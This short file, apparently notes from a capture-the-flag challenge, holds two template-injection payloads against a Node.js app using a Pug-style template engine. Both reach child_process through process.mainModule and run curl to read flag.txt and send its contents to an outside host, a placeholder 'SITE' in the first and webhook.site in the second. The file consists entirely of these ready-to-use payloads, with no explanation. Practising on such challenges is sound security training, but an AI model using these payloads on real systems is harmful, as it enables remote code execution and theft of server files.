# 1

```
template[]=#{function(){a=global.process.mainModule.constructor._load;sh=a("child_process").exec('curl -X POST -d "flag=$(cat flag.txt)" http://SITE')}()}&pretty=
```



# 2

```
template=html%0D%0A++head%0D%0A++body%0D%0A++++mixin+print%28text%29%0D%0A++++++p%3D+text%0D%0A%0D%0A++++%2Bprint%28%27Hello%2C+world%27%29&pretty=');process.mainModule.constructor._load("child_process").exec('curl+https://webhook.site/?x=$(cat+/usr/src/app/flag.txt)');_=('
```
